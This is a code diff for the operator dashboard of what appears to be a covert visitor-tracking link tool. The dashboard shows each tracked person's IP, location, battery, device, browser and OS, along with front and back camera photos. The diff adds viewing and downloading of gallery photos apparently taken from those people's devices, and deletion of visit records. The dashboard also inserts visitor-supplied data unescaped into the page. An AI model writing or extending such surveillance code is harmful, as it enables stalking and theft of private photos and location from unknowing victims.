@@ -47,6 +47,10 @@ socket.on('location-data', () => {
     refreshAllData();
 });
 
+socket.on('gallery-data', () => {
+    refreshAllData();
+});
+
 // ============================================
 // TAB SWITCHING
 // ============================================
@@ -208,6 +212,7 @@ function displayVisitors(visitors) {
                         ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                         ${visitor.totalVisits ? `• 🔄 ${visitor.totalVisits} visits` : ''}
                         ${visitor.linkId ? `• 🔗 ${visitor.linkId}` : ''}
+                        ${visitor.browser ? `• 🌍 ${visitor.browser}` : ''}
                     </div>
                     ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                     ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
@@ -238,10 +243,8 @@ function displayAllUsers(users) {
         return;
     }
     
-    // Apply filters
     let filteredUsers = [...users];
     
-    // Date filter
     if (currentFilter !== 'all') {
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
@@ -269,7 +272,6 @@ function displayAllUsers(users) {
         });
     }
     
-    // Sort
     if (currentSort === 'newest') {
         filteredUsers.sort((a, b) => new Date(b.visitDate) - new Date(a.visitDate));
     } else {
@@ -300,6 +302,8 @@ function displayAllUsers(users) {
                         📱 ${user.deviceName || 'Unknown'} 
                         ${user.ip ? `• 🌐 ${user.ip}` : ''}
                         ${user.linkId ? `• 🔗 ${user.linkId}` : ''}
+                        ${user.browser ? `• 🌍 ${user.browser}` : ''}
+                        ${user.os ? `• 💻 ${user.os}` : ''}
                         ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
                         ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
                     </div>
@@ -316,15 +320,46 @@ function displayAllUsers(users) {
                 ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
                 ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
                 <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
+                ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `<button onclick="viewGallery('${user.id}')" class="camera-btn" style="background:#9f7aea;">🖼️ View Gallery</button>` : ''}
             </div>
             <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                 ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
                 ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
+                ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `<span style="font-size:12px; color:#888; padding:5px;">🖼️ ${user.galleryPhotos.length} photos</span>` : ''}
             </div>
             ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
         `;
         container.appendChild(card);
     });
+}
+
+// ============================================
+// VIEW GALLERY
+// ============================================
+function viewGallery(userId) {
+    fetch(`/api/visitor/${userId}`)
+        .then(response => response.json())
+        .then(user => {
+            const photos = user.galleryPhotos || [];
+            const content = document.getElementById('galleryContent');
+            content.innerHTML = '';
+            
+            if (photos.length === 0) {
+                content.innerHTML = '<p style="color:#999;">No photos found</p>';
+            } else {
+                photos.forEach((photo, index) => {
+                    const div = document.createElement('div');
+                    div.style.cssText = 'position:relative; display:inline-block;';
+                    div.innerHTML = `
+                        <img src="${photo}" style="width:150px; height:150px; object-fit:cover; border-radius:8px; cursor:pointer;" onclick="downloadPhoto('${photo}', 'gallery-${userId}-${index}.jpg')">
+                        <button onclick="downloadPhoto('${photo}', 'gallery-${userId}-${index}.jpg')" style="position:absolute; bottom:5px; right:5px; background:rgba(0,0,0,0.6); color:white; border:none; border-radius:5px; padding:2px 8px; cursor:pointer; font-size:11px;">⬇️</button>
+                    `;
+                    content.appendChild(div);
+                });
+            }
+            
+            document.getElementById('galleryModal').style.display = 'flex';
+        });
 }
 
 // ============================================
@@ -465,10 +500,13 @@ function showUserDetails(userId) {
                                 ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
                                 ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
                                 ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
+                                ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `• 🖼️ ${visit.galleryPhotos.length} photos` : ''}
                             </div>
-                            <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">
-                                👁️ View
-                            </button>
+                            <div>
+                                <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">👁️ View</button>
+                                <button onclick="deleteVisit('${userId}', ${index})" class="camera-btn" style="background:#fc8181; padding:3px 10px; font-size:12px;">🗑️</button>
+                                ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `<button onclick="viewGalleryVisit('${userId}', ${index})" class="camera-btn" style="background:#9f7aea; padding:3px 10px; font-size:12px;">🖼️</button>` : ''}
+                            </div>
                         </div>
                     `;
                 });
@@ -485,6 +523,8 @@ function showUserDetails(userId) {
                             <div class="detail-card"><label>🆔 ID</label><div class="value">${user.id}</div></div>
                             <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
                             <div class="detail-card"><label>📱 Device</label><div class="value">${user.deviceName || 'N/A'}</div></div>
+                            <div class="detail-card"><label>💻 OS</label><div class="value">${user.os || 'N/A'}</div></div>
+                            <div class="detail-card"><label>🌍 Browser</label><div class="value">${user.browser || 'N/A'}</div></div>
                             <div class="detail-card"><label>🌐 IP Address</label><div class="value">${user.ip || 'N/A'}</div></div>
                             <div class="detail-card"><label>📶 Network</label><div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div></div>
                             <div class="detail-card"><label>🔋 Battery</label><div class="value">${user.battery || 'N/A'}%</div></div>
@@ -492,6 +532,7 @@ function showUserDetails(userId) {
                             <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${user.totalVisits || 0}</div></div>
                             <div class="detail-card"><label>📅 Last Visit</label><div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div></div>
                             <div class="detail-card"><label>🟢 Status</label><div class="value">${user.connected ? 'Online' : 'Offline'}</div></div>
+                            <div class="detail-card"><label>🖼️ Gallery</label><div class="value">${user.galleryPhotos && user.galleryPhotos.length > 0 ? `${user.galleryPhotos.length} photos` : 'N/A'}</div></div>
                         </div>
                         ${visitHistoryHTML}
                     </div>
@@ -527,6 +568,13 @@ function showUserDetails(userId) {
                                     </div>
                                 </div>
                             ` : '<p style="color:#999;">No back photo</p>'}
+                            
+                            ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `
+                                <div>
+                                    <p><strong>🖼️ Gallery (${user.galleryPhotos.length} photos)</strong></p>
+                                    <button onclick="viewGallery('${user.id}')" class="camera-btn" style="background:#9f7aea;">View Gallery</button>
+                                </div>
+                            ` : ''}
                         </div>
                         
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
@@ -566,16 +614,74 @@ function showVisitDetails(userId, visitIndex) {
                     <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A'}</div></div>
                     <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visit.ip || 'N/A'}</div></div>
                     <div class="detail-card"><label>📱 Device</label><div class="value">${visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'}</div></div>
+                    <div class="detail-card"><label>💻 OS</label><div class="value">${visit.deviceInfo?.os || 'N/A'}</div></div>
+                    <div class="detail-card"><label>🌍 Browser</label><div class="value">${visit.deviceInfo?.browser || 'N/A'}</div></div>
                     <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
                     <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
                     <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
                     ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                     ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `<div class="detail-card"><label>🖼️ Gallery</label><div class="value">${visit.galleryPhotos.length} photos</div></div>` : ''}
                     <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                 </div>
             `;
             
             modal.style.display = 'flex';
+        });
+}
+
+// ============================================
+// VIEW GALLERY FROM VISIT
+// ============================================
+function viewGalleryVisit(userId, visitIndex) {
+    fetch(`/api/visitor/${userId}`)
+        .then(response => response.json())
+        .then(user => {
+            const visit = user.visitHistory[visitIndex];
+            if (!visit || !visit.galleryPhotos) {
+                alert('No gallery photos found for this visit');
+                return;
+            }
+            
+            const photos = visit.galleryPhotos || [];
+            const content = document.getElementById('galleryContent');
+            content.innerHTML = '';
+            
+            if (photos.length === 0) {
+                content.innerHTML = '<p style="color:#999;">No photos found</p>';
+            } else {
+                photos.forEach((photo, index) => {
+                    const div = document.createElement('div');
+                    div.style.cssText = 'position:relative; display:inline-block;';
+                    div.innerHTML = `
+                        <img src="${photo}" style="width:150px; height:150px; object-fit:cover; border-radius:8px; cursor:pointer;" onclick="downloadPhoto('${photo}', 'gallery-${userId}-${visitIndex}-${index}.jpg')">
+                        <button onclick="downloadPhoto('${photo}', 'gallery-${userId}-${visitIndex}-${index}.jpg')" style="position:absolute; bottom:5px; right:5px; background:rgba(0,0,0,0.6); color:white; border:none; border-radius:5px; padding:2px 8px; cursor:pointer; font-size:11px;">⬇️</button>
+                    `;
+                    content.appendChild(div);
+                });
+            }
+            
+            document.getElementById('galleryModal').style.display = 'flex';
+        });
+}
+
+// ============================================
+// DELETE VISIT FROM HISTORY
+// ============================================
+function deleteVisit(userId, visitIndex) {
+    if (!confirm('Delete this visit from history?')) return;
+    
+    fetch(`/api/visitor/${userId}/visit/${visitIndex}`, { method: 'DELETE' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification('🗑️ Visit deleted successfully!');
+                refreshAllData();
+                showUserDetails(userId);
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
         });
 }
 
